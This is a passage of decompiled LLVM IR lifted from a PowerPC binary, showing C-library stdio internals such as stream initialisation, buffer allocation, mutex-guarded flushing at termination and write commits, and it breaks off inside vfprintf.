dec_label_pc_1001a088.dec_label_pc_1001a0a8_crit_edge: ; preds = %dec_label_pc_1001a088
  %v0_1001a0ac.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001a0a8

dec_label_pc_1001a0a8:                            ; preds = %dec_label_pc_1001a088.dec_label_pc_1001a0a8_crit_edge, %dec_label_pc_1001a070
  %v0_1001a0ac = phi i32 [ %v0_1001a0ac.pre, %dec_label_pc_1001a088.dec_label_pc_1001a0a8_crit_edge ], [ %v2_1001a074, %dec_label_pc_1001a070 ]
  %v0_1001a0a8 = load i32, i32* @r31, align 4
  %v1_1001a0a8 = inttoptr i32 %v0_1001a0a8 to i16*
  %v2_1001a0a8 = load i16, i16* %v1_1001a0a8, align 2
  %v3_1001a0a8 = zext i16 %v2_1001a0a8 to i32
  store i32 %v3_1001a0a8, i32* %r0.global-to-local, align 4
  %v1_1001a0ac = urem i32 %v0_1001a0ac, 4
  store i32 %v1_1001a0ac, i32* %r29.global-to-local, align 4
  %v1_1001a0b0 = call i32 @__asm_rlwinm(i32 %v0_1001a0ac, i32 0, i32 21, i32 21)
  %v1_1001a0b4 = add nuw nsw i32 %v1_1001a0ac, 1
  store i32 %v1_1001a0b4, i32* %r29.global-to-local, align 4
  %v1_1001a0b8 = call i32 @__asm_rlwinm(i32 %v3_1001a0a8, i32 0, i32 18, i32 18)
  store i32 %v1_1001a0b8, i32* %r0.global-to-local, align 4
  %v1_1001a0bc = xor i32 %v1_1001a0b4, 3
  store i32 %v1_1001a0bc, i32* %r29.global-to-local, align 4
  %v1_1001a0c0 = urem i32 %v1_1001a0b8, 65536
  store i32 %v1_1001a0c0, i32* %r9.global-to-local, align 4
  %v0_1001a0c4 = load i32, i32* @r28, align 4
  %v1_1001a0c4 = call i32 @__asm_rlwinm(i32 %v0_1001a0c4, i32 31, i32 16, i32 16)
  %v2_1001a0c8 = or i32 %v1_1001a0c4, %v1_1001a0b0
  store i32 %v2_1001a0c8, i32* %r0.global-to-local, align 4
  %v0_1001a0cc = load i32, i32* %r29.global-to-local, align 4
  %v1_1001a0cc = mul i32 %v0_1001a0cc, 16
  %v0_1001a0d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001a0d0 = or i32 %v0_1001a0d0, %v2_1001a0c8
  store i32 %v2_1001a0d0, i32* %r9.global-to-local, align 4
  %v2_1001a0d4 = or i32 %v2_1001a0d0, %v1_1001a0cc
  store i32 %v2_1001a0d4, i32* @r29, align 4
  %v1_1001a0d8 = trunc i32 %v2_1001a0d4 to i16
  %v2_1001a0d8 = load i32, i32* @r31, align 4
  %v3_1001a0d8 = inttoptr i32 %v2_1001a0d8 to i16*
  store i16 %v1_1001a0d8, i16* %v3_1001a0d8, align 2
  %v0_1001a0dc = call i32 @__errno_location()
  store i32 %v0_1001a0dc, i32* @r28, align 4
  %v0_1001a0e4 = load i32, i32* @r31, align 4
  %v1_1001a0e4 = add i32 %v0_1001a0e4, 4
  %v2_1001a0e4 = inttoptr i32 %v1_1001a0e4 to i32*
  %v3_1001a0e4 = load i32, i32* %v2_1001a0e4, align 4
  store i32 %v3_1001a0e4, i32* @r3, align 4
  %v1_1001a0e8 = inttoptr i32 %v0_1001a0dc to i32*
  %v2_1001a0e8 = load i32, i32* %v1_1001a0e8, align 4
  store i32 %v2_1001a0e8, i32* @r27, align 4
  store i32 268542192, i32* @lr, align 4
  %v1_1001a0ec = call i32 @isatty(i32 %v3_1001a0e4)
  %v1_1001a0f0 = mul i32 %v1_1001a0ec, 256
  %v0_1001a0f4 = load i32, i32* @r29, align 4
  %v2_1001a0f4 = or i32 %v0_1001a0f4, %v1_1001a0f0
  store i32 %v2_1001a0f4, i32* @r29, align 4
  %v1_1001a0f8 = trunc i32 %v2_1001a0f4 to i16
  %v2_1001a0f8 = load i32, i32* @r31, align 4
  %v3_1001a0f8 = inttoptr i32 %v2_1001a0f8 to i16*
  store i16 %v1_1001a0f8, i16* %v3_1001a0f8, align 2
  %v0_1001a0fc = load i32, i32* @r27, align 4
  %v1_1001a0fc = load i32, i32* @r28, align 4
  %v2_1001a0fc = inttoptr i32 %v1_1001a0fc to i32*
  store i32 %v0_1001a0fc, i32* %v2_1001a0fc, align 4
  %v0_1001a100 = load i32, i32* @r31, align 4
  %v1_1001a100 = add i32 %v0_1001a100, 8
  %v2_1001a100 = inttoptr i32 %v1_1001a100 to i32*
  %v3_1001a100 = load i32, i32* %v2_1001a100, align 4
  store i32 %v3_1001a100, i32* %r0.global-to-local, align 4
  %v3_1001a104 = icmp eq i32 %v3_1001a100, 0
  br i1 %v3_1001a104, label %dec_label_pc_1001a10c, label %dec_label_pc_1001a13c

dec_label_pc_1001a10c:                            ; preds = %dec_label_pc_1001a0a8
  store i32 4096, i32* @r3, align 4
  store i32 268542228, i32* @lr, align 4
  %v0_1001a110 = call i32 @malloc()
  %v3_1001a114 = icmp eq i32 %v0_1001a110, 0
  %v1_1001a118 = load i32, i32* @r31, align 4
  %v2_1001a118 = add i32 %v1_1001a118, 8
  %v3_1001a118 = inttoptr i32 %v2_1001a118 to i32*
  store i32 %v0_1001a110, i32* %v3_1001a118, align 4
  %v1_1001a138 = load i32, i32* @r31, align 4
  br i1 %v3_1001a114, label %dec_label_pc_1001a138, label %dec_label_pc_1001a120

dec_label_pc_1001a120:                            ; preds = %dec_label_pc_1001a10c
  %v1_1001a120 = inttoptr i32 %v1_1001a138 to i16*
  %v2_1001a120 = load i16, i16* %v1_1001a120, align 2
  %v3_1001a120 = zext i16 %v2_1001a120 to i32
  store i32 %v3_1001a120, i32* %r0.global-to-local, align 4
  %v1_1001a124 = add i32 %v0_1001a110, 4096
  store i32 %v1_1001a124, i32* %r9.global-to-local, align 4
  %v2_1001a128 = add i32 %v1_1001a138, 12
  %v3_1001a128 = inttoptr i32 %v2_1001a128 to i32*
  store i32 %v1_1001a124, i32* %v3_1001a128, align 4
  %v0_1001a12c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001a12c = or i32 %v0_1001a12c, 16384
  store i32 %v1_1001a12c, i32* %r0.global-to-local, align 4
  %v1_1001a130 = trunc i32 %v1_1001a12c to i16
  %v2_1001a130 = load i32, i32* @r31, align 4
  %v3_1001a130 = inttoptr i32 %v2_1001a130 to i16*
  store i16 %v1_1001a130, i16* %v3_1001a130, align 2
  br label %dec_label_pc_1001a13c

dec_label_pc_1001a138:                            ; preds = %dec_label_pc_1001a10c
  %v2_1001a138 = add i32 %v1_1001a138, 12
  %v3_1001a138 = inttoptr i32 %v2_1001a138 to i32*
  store i32 0, i32* %v3_1001a138, align 4
  br label %dec_label_pc_1001a13c

dec_label_pc_1001a13c:                            ; preds = %dec_label_pc_1001a0a8, %dec_label_pc_1001a120, %dec_label_pc_1001a138
  %v0_1001a13c = load i32, i32* @r31, align 4
  %v1_1001a13c = inttoptr i32 %v0_1001a13c to i16*
  %v2_1001a13c = load i16, i16* %v1_1001a13c, align 2
  %v3_1001a13c = zext i16 %v2_1001a13c to i32
  store i32 %v3_1001a13c, i32* %r0.global-to-local, align 4
  %v1_1001a140 = add i32 %v0_1001a13c, 8
  %v2_1001a140 = inttoptr i32 %v1_1001a140 to i32*
  %v3_1001a140 = load i32, i32* %v2_1001a140, align 4
  store i32 %v3_1001a140, i32* %r9.global-to-local, align 4
  %v1_1001a144 = and i32 %v3_1001a13c, 8192
  %v3_1001a144 = icmp eq i32 %v1_1001a144, 0
  store i1 %v3_1001a144, i1* %cr0_eq.global-to-local, align 1
  %v3_1001a14c = add i32 %v0_1001a13c, 2
  %v4_1001a14c = inttoptr i32 %v3_1001a14c to i8*
  store i8 0, i8* %v4_1001a14c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001a154 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a154 = load i32, i32* @r31, align 4
  %v2_1001a154 = add i32 %v1_1001a154, 20
  %v3_1001a154 = inttoptr i32 %v2_1001a154 to i32*
  store i32 %v0_1001a154, i32* %v3_1001a154, align 4
  %v0_1001a158 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a158 = load i32, i32* @r31, align 4
  %v2_1001a158 = add i32 %v1_1001a158, 24
  %v3_1001a158 = inttoptr i32 %v2_1001a158 to i32*
  store i32 %v0_1001a158, i32* %v3_1001a158, align 4
  %v0_1001a15c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a15c = load i32, i32* @r31, align 4
  %v2_1001a15c = add i32 %v1_1001a15c, 28
  %v3_1001a15c = inttoptr i32 %v2_1001a15c to i32*
  store i32 %v0_1001a15c, i32* %v3_1001a15c, align 4
  %v0_1001a160 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a160 = load i32, i32* @r31, align 4
  %v2_1001a160 = add i32 %v1_1001a160, 16
  %v3_1001a160 = inttoptr i32 %v2_1001a160 to i32*
  store i32 %v0_1001a160, i32* %v3_1001a160, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_1001a168 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001a168 = load i32, i32* @r31, align 4
  %v2_1001a168 = add i32 %v1_1001a168, 44
  %v3_1001a168 = inttoptr i32 %v2_1001a168 to i32*
  store i32 %v0_1001a168, i32* %v3_1001a168, align 4
  %v3_1001a16c = load i32, i32* @global_var_1004514c.999, align 4
  store i32 %v3_1001a16c, i32* %r0.global-to-local, align 4
  %v1_1001a170 = load i32, i32* @r31, align 4
  %v2_1001a170 = add i32 %v1_1001a170, 52
  %v3_1001a170 = inttoptr i32 %v2_1001a170 to i32*
  store i32 %v3_1001a16c, i32* %v3_1001a170, align 4
  %v0_1001a174 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1001a174, label %dec_label_pc_1001a1f8, label %dec_label_pc_1001a178

dec_label_pc_1001a178:                            ; preds = %dec_label_pc_1001a13c
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10044d78.1134 to i32), i32* %r29.global-to-local, align 4
  %v2_1001a188 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001a188, i32* @r26, align 4
  %v4_1001a198 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044d78.1134 to i32))
  %v2_1001a1a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001a1a4, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10044d60.1156 to i32), i32* @r29, align 4
  store i32 268542384, i32* @lr, align 4
  %v1_1001a1ac = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d78.1134 to i32))
  %v0_1001a1b0 = load i32, i32* @r28, align 4
  %v0_1001a1b4 = load i32, i32* @r29, align 4
  %v4_1001a1bc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001a1b0, i32 %v0_1001a1b4)
  %v0_1001a1c0 = load i32, i32* @r29, align 4
  store i32 268542408, i32* @lr, align 4
  %v1_1001a1c4 = call i32 @pthread_mutex_lock(i32 %v0_1001a1c0)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001a1cc = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  store i32 %v3_1001a1cc, i32* %r0.global-to-local, align 4
  store i32 %v2_1001a1a4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001a1d8 = load i32, i32* @r31, align 4
  %v2_1001a1d8 = add i32 %v1_1001a1d8, 32
  %v3_1001a1d8 = inttoptr i32 %v2_1001a1d8 to i32*
  store i32 %v3_1001a1cc, i32* %v3_1001a1d8, align 4
  %v0_1001a1dc = load i32, i32* @r31, align 4
  store i32 %v0_1001a1dc, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  store i32 268542436, i32* @lr, align 4
  %v0_1001a1e0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_1001a188, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001a1f0.1157 to i32), i32* @lr, align 4
  %v0_1001a1ec = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001a1f8

dec_label_pc_1001a1f4:                            ; preds = %dec_label_pc_10019fa8, %dec_label_pc_10019f94, %dec_label_pc_10019fb4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001a1f8

dec_label_pc_1001a1f8:                            ; preds = %dec_label_pc_1001a13c, %dec_label_pc_10019ff4, %dec_label_pc_1001a178, %dec_label_pc_1001a1f4
  store i32 %v0_10019f54, i32* %r0.global-to-local, align 4
  %v0_1001a1fc = load i32, i32* @r31, align 4
  ret i32 %v0_1001a1fc

; uselistorder directives
  uselistorder i32 %v1_1001a138, { 2, 0, 1 }
  uselistorder i32 %v0_1001a0ac, { 1, 0 }
  uselistorder i32 %v0_10019ff8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10019fe4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 9, 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 21, { 3, 4, 2, 0, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001a1f8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a1f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a13c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001a088, { 1, 0 }
  uselistorder label %dec_label_pc_1001a01c, { 1, 0 }
  uselistorder label %dec_label_pc_10019fec, { 1, 0 }
  uselistorder label %dec_label_pc_10019fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10019fc4, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268697600, i32* @r28, align 4
  %v0_1001a224 = call i32 @__errno_location()
  store i32 %v0_1001a224, i32* @r26, align 4
  store i32 0, i32* @r3, align 4
  %v1_1001a230 = inttoptr i32 %v0_1001a224 to i32*
  %v2_1001a230 = load i32, i32* %v1_1001a230, align 4
  store i32 %v2_1001a230, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10044d90.997 to i32), i32* @r27, align 4
  %v3_1001a238 = load i16, i16* @global_var_10044d90.997, align 2
  %v4_1001a238 = zext i16 %v3_1001a238 to i32
  store i32 %v4_1001a238, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001a240.1158 to i32), i32* @lr, align 4
  %v1_1001a23c = call i32 @isatty(i32 0)
  %v1_1001a240 = sub i32 1, %v1_1001a23c
  %v1_1001a244 = mul i32 %v1_1001a240, 256
  %v0_1001a248 = load i32, i32* @r29, align 4
  %v2_1001a248 = xor i32 %v1_1001a244, %v0_1001a248
  store i32 1, i32* @r3, align 4
  %v1_1001a250 = trunc i32 %v2_1001a248 to i16
  store i16 %v1_1001a250, i16* @global_var_10044d90.997, align 2
  %v3_1001a254 = load i16, i16* @global_var_10044de0.1132, align 2
  %v4_1001a254 = zext i16 %v3_1001a254 to i32
  store i32 %v4_1001a254, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001a25c.1159 to i32), i32* @lr, align 4
  %v1_1001a258 = call i32 @isatty(i32 1)
  %v1_1001a25c = sub i32 1, %v1_1001a258
  %v1_1001a260 = mul i32 %v1_1001a25c, 256
  %v0_1001a264 = load i32, i32* @r29, align 4
  %v2_1001a264 = xor i32 %v1_1001a260, %v0_1001a264
  %v1_1001a268 = trunc i32 %v2_1001a264 to i16
  store i16 %v1_1001a268, i16* @global_var_10044de0.1132, align 2
  %v0_1001a26c = load i32, i32* @r25, align 4
  %v1_1001a26c = load i32, i32* @r26, align 4
  %v2_1001a26c = inttoptr i32 %v1_1001a26c to i32*
  store i32 %v0_1001a26c, i32* %v2_1001a26c, align 4
  ret i32 %v1_1001a260

; uselistorder directives
  uselistorder i32 %v1_1001a260, { 1, 0 }
  uselistorder i16* @global_var_10044de0.1132, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1002e3f0.1160 to i32), i32* @r4, align 4
  %v0_1001a290 = call i32 @memcpy()
  ret i32 %v0_1001a290
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10044d60.1156 to i32), i32* @r3, align 4
  store i32 268542640, i32* @lr, align 4
  %v0_1001a2ac = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10044d78.1134 to i32), i32* @r3, align 4
  store i32 268542652, i32* @lr, align 4
  %v0_1001a2b8 = call i32 @__stdio_init_mutex()
  store i32 268697600, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  %v3_1001a3049 = icmp eq i32 %storemerge6, 0
  %v1_1001a30811 = add i32 %storemerge6, 56
  store i32 %v1_1001a30811, i32* @r30, align 4
  br i1 %v3_1001a3049, label %dec_label_pc_1001a314, label %dec_label_pc_1001a2c8

dec_label_pc_1001a2c8:                            ; preds = %entry, %dec_label_pc_1001a2f4
  %v0_1001a2c8 = phi i32 [ %v1_1001a308, %dec_label_pc_1001a2f4 ], [ %v1_1001a30811, %entry ]
  store i32 268542668, i32* @lr, align 4
  %v1_1001a2c8 = call i32 @pthread_mutex_trylock(i32 %v0_1001a2c8)
  %v3_1001a2cc = icmp eq i32 %v1_1001a2c8, 0
  %v0_1001a2d0 = load i32, i32* @r30, align 4
  store i32 %v0_1001a2d0, i32* @r3, align 4
  br i1 %v3_1001a2cc, label %dec_label_pc_1001a2f4, label %dec_label_pc_1001a2d8

dec_label_pc_1001a2d8:                            ; preds = %dec_label_pc_1001a2c8
  %v0_1001a2d8 = load i32, i32* @r31, align 4
  %v1_1001a2d8 = add i32 %v0_1001a2d8, 8
  %v2_1001a2d8 = inttoptr i32 %v1_1001a2d8 to i32*
  %v3_1001a2d8 = load i32, i32* %v2_1001a2d8, align 4
  store i32 %v3_1001a2d8, i32* %r9.global-to-local, align 4
  %v3_1001a2e0 = inttoptr i32 %v0_1001a2d8 to i16*
  store i16 48, i16* %v3_1001a2e0, align 2
  %v0_1001a2e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2e4 = load i32, i32* @r31, align 4
  %v2_1001a2e4 = add i32 %v1_1001a2e4, 20
  %v3_1001a2e4 = inttoptr i32 %v2_1001a2e4 to i32*
  store i32 %v0_1001a2e4, i32* %v3_1001a2e4, align 4
  %v0_1001a2e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2e8 = load i32, i32* @r31, align 4
  %v2_1001a2e8 = add i32 %v1_1001a2e8, 24
  %v3_1001a2e8 = inttoptr i32 %v2_1001a2e8 to i32*
  store i32 %v0_1001a2e8, i32* %v3_1001a2e8, align 4
  %v0_1001a2ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2ec = load i32, i32* @r31, align 4
  %v2_1001a2ec = add i32 %v1_1001a2ec, 28
  %v3_1001a2ec = inttoptr i32 %v2_1001a2ec to i32*
  store i32 %v0_1001a2ec, i32* %v3_1001a2ec, align 4
  %v0_1001a2f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2f0 = load i32, i32* @r31, align 4
  %v2_1001a2f0 = add i32 %v1_1001a2f0, 16
  %v3_1001a2f0 = inttoptr i32 %v2_1001a2f0 to i32*
  store i32 %v0_1001a2f0, i32* %v3_1001a2f0, align 4
  br label %dec_label_pc_1001a2f4

dec_label_pc_1001a2f4:                            ; preds = %dec_label_pc_1001a2c8, %dec_label_pc_1001a2d8
  %v1_1001a2f8 = load i32, i32* @r31, align 4
  %v2_1001a2f8 = add i32 %v1_1001a2f8, 52
  %v3_1001a2f8 = inttoptr i32 %v2_1001a2f8 to i32*
  store i32 1, i32* %v3_1001a2f8, align 4
  store i32 268542720, i32* @lr, align 4
  %v0_1001a2fc = call i32 @__stdio_init_mutex()
  %v0_1001a300 = load i32, i32* @r31, align 4
  %v1_1001a300 = add i32 %v0_1001a300, 32
  %v2_1001a300 = inttoptr i32 %v1_1001a300 to i32*
  %storemerge = load i32, i32* %v2_1001a300, align 4
  %v3_1001a304 = icmp eq i32 %storemerge, 0
  %v1_1001a308 = add i32 %storemerge, 56
  store i32 %v1_1001a308, i32* @r30, align 4
  br i1 %v3_1001a304, label %dec_label_pc_1001a304.dec_label_pc_1001a314_crit_edge, label %dec_label_pc_1001a2c8

dec_label_pc_1001a304.dec_label_pc_1001a314_crit_edge: ; preds = %dec_label_pc_1001a2f4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  br label %dec_label_pc_1001a314

dec_label_pc_1001a314:                            ; preds = %dec_label_pc_1001a304.dec_label_pc_1001a314_crit_edge, %entry
  %v0_1001a35017 = phi i32 [ %v1_1001a308, %dec_label_pc_1001a304.dec_label_pc_1001a314_crit_edge ], [ %v1_1001a30811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1001a304.dec_label_pc_1001a314_crit_edge ], [ 0, %entry ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1001a3385 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1001a3385, label %dec_label_pc_1001a340, label %dec_label_pc_1001a320

dec_label_pc_1001a320:                            ; preds = %dec_label_pc_1001a314, %dec_label_pc_1001a334
  %v0_1001a320 = phi i32 [ %storemerge1, %dec_label_pc_1001a334 ], [ %storemerge12, %dec_label_pc_1001a314 ]
  %v1_1001a320 = inttoptr i32 %v0_1001a320 to i16*
  %v2_1001a320 = load i16, i16* %v1_1001a320, align 2
  %v3_1001a320 = zext i16 %v2_1001a320 to i32
  store i32 %v0_1001a320, i32* @r3, align 4
  %v1_1001a328 = and i32 %v3_1001a320, 64
  store i32 %v1_1001a328, i32* %r9.global-to-local, align 4
  %v3_1001a328 = icmp eq i32 %v1_1001a328, 0
  br i1 %v3_1001a328, label %dec_label_pc_1001a334, label %dec_label_pc_1001a330

dec_label_pc_1001a330:                            ; preds = %dec_label_pc_1001a320
  store i32 268542772, i32* @lr, align 4
  %v0_1001a330 = call i32 @__stdio_wcommit()
  %v0_1001a334.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a334

dec_label_pc_1001a334:                            ; preds = %dec_label_pc_1001a320, %dec_label_pc_1001a330
  %v0_1001a334 = phi i32 [ %v0_1001a320, %dec_label_pc_1001a320 ], [ %v0_1001a334.pre, %dec_label_pc_1001a330 ]
  %v0_1001a35018 = phi i32 [ %v0_1001a320, %dec_label_pc_1001a320 ], [ %v0_1001a330, %dec_label_pc_1001a330 ]
  %v1_1001a334 = add i32 %v0_1001a334, 32
  %v2_1001a334 = inttoptr i32 %v1_1001a334 to i32*
  %storemerge1 = load i32, i32* %v2_1001a334, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1001a338 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1001a338, label %dec_label_pc_1001a340, label %dec_label_pc_1001a320

dec_label_pc_1001a340:                            ; preds = %dec_label_pc_1001a334, %dec_label_pc_1001a314
  %v0_1001a350 = phi i32 [ %v0_1001a35017, %dec_label_pc_1001a314 ], [ %v0_1001a35018, %dec_label_pc_1001a334 ]
  ret i32 %v0_1001a350

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1001a320, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_1001a308, { 0, 2, 1 }
  uselistorder i32 %v1_1001a30811, { 1, 0, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1001a334, { 1, 0 }
  uselistorder label %dec_label_pc_1001a320, { 1, 0 }
  uselistorder label %dec_label_pc_1001a2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1001a2c8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1001a35c = load i32, i32* @r31, align 4
  %v0_1001a360 = load i32, i32* @r3, align 4
  %v1_1001a368 = add i32 %v0_1001a360, 8
  %v2_1001a368 = inttoptr i32 %v1_1001a368 to i32*
  %v3_1001a368 = load i32, i32* %v2_1001a368, align 4
  %v1_1001a36c = add i32 %v0_1001a360, 16
  %v2_1001a36c = inttoptr i32 %v1_1001a36c to i32*
  %v3_1001a36c = load i32, i32* %v2_1001a36c, align 4
  %v2_1001a374 = sub i32 %v3_1001a36c, %v3_1001a368
  store i32 %v2_1001a374, i32* @r5, align 4
  %v5_1001a374 = icmp eq i32 %v2_1001a374, 0
  br i1 %v5_1001a374, label %dec_label_pc_1001a384, label %dec_label_pc_1001a37c

dec_label_pc_1001a37c:                            ; preds = %entry
  store i32 %v3_1001a368, i32* %v2_1001a36c, align 4
  store i32 268542852, i32* @lr, align 4
  %v2_1001a380 = inttoptr i32 %v3_1001a368 to i16*
  %v3_1001a380 = call i32 @__stdio_WRITE(i16* %v2_1001a380, i32 %v2_1001a374)
  %v0_1001a384.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a384

dec_label_pc_1001a384:                            ; preds = %entry, %dec_label_pc_1001a37c
  %v0_1001a384 = phi i32 [ %v0_1001a360, %entry ], [ %v0_1001a384.pre, %dec_label_pc_1001a37c ]
  %v1_1001a384 = add i32 %v0_1001a384, 8
  %v2_1001a384 = inttoptr i32 %v1_1001a384 to i32*
  %v3_1001a384 = load i32, i32* %v2_1001a384, align 4
  %v1_1001a388 = add i32 %v0_1001a384, 16
  %v2_1001a388 = inttoptr i32 %v1_1001a388 to i32*
  %v3_1001a388 = load i32, i32* %v2_1001a388, align 4
  store i32 %v0_1001a35c, i32* @r31, align 4
  %v2_1001a390 = sub i32 %v3_1001a388, %v3_1001a384
  ret i32 %v2_1001a390

; uselistorder directives
  uselistorder i32 %v0_1001a384, { 1, 0 }
  uselistorder i32 %v3_1001a368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a384, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001a3b0 = load i32, i32* @r3, align 4
  %v1_1001a3b0 = add i32 %v0_1001a3b0, 56
  store i32 %v1_1001a3b0, i32* %r30.global-to-local, align 4
  %v0_1001a3b8 = load i32, i32* @r4, align 4
  store i32 %v0_1001a3b8, i32* @r29, align 4
  store i32 %v0_1001a3b0, i32* @r31, align 4
  %v1_1001a3c4 = add i32 %v0_1001a3b0, 52
  %v2_1001a3c4 = inttoptr i32 %v1_1001a3c4 to i32*
  %v3_1001a3c4 = load i32, i32* %v2_1001a3c4, align 4
  store i32 %v3_1001a3c4, i32* @r28, align 4
  %v0_1001a3c8 = load i32, i32* @r5, align 4
  store i32 %v0_1001a3c8, i32* @r27, align 4
  %v2_1001a3cc = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001a3d4 = icmp eq i32 %v3_1001a3c4, 0
  br i1 %v3_1001a3d4, label %dec_label_pc_1001a3e0, label %dec_label_pc_1001a3ec

dec_label_pc_1001a3e0:                            ; preds = %entry
  %v4_1001a3e0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v1_1001a3b0)
  %v0_1001a3e4 = load i32, i32* %r30.global-to-local, align 4
  store i32 268542956, i32* @lr, align 4
  %v1_1001a3e8 = call i32 @pthread_mutex_lock(i32 %v0_1001a3e4)
  %v0_1001a3ec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a3ec

dec_label_pc_1001a3ec:                            ; preds = %entry, %dec_label_pc_1001a3e0
  %v0_1001a3ec = phi i32 [ %v0_1001a3b0, %entry ], [ %v0_1001a3ec.pre, %dec_label_pc_1001a3e0 ]
  %v1_1001a3ec = inttoptr i32 %v0_1001a3ec to i16*
  %v2_1001a3ec = load i16, i16* %v1_1001a3ec, align 2
  %v3_1001a3ec = zext i16 %v2_1001a3ec to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_1001a3ec, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_1001a3fc = call i32 @__asm_rlwinm(i32 %v3_1001a3ec, i32 0, i32 24, i32 25)
  %v3_1001a400 = icmp eq i32 %v1_1001a3fc, 192
  br i1 %v3_1001a400, label %dec_label_pc_1001a414, label %dec_label_pc_1001a408

dec_label_pc_1001a408:                            ; preds = %dec_label_pc_1001a3ec
  store i32 268542988, i32* @lr, align 4
  %v0_1001a408 = call i32 @__stdio_trans2w_o()
  %v3_1001a40c = icmp eq i32 %v0_1001a408, 0
  br i1 %v3_1001a40c, label %dec_label_pc_1001a414, label %dec_label_pc_1001a428

dec_label_pc_1001a414:                            ; preds = %dec_label_pc_1001a408, %dec_label_pc_1001a3ec
  %v0_1001a414 = load i32, i32* @r29, align 4
  store i32 %v0_1001a414, i32* @r4, align 4
  %v0_1001a418 = load i32, i32* @r27, align 4
  store i32 %v0_1001a418, i32* @r5, align 4
  %v0_1001a41c = load i32, i32* @r31, align 4
  store i32 %v0_1001a41c, i32* @r3, align 4
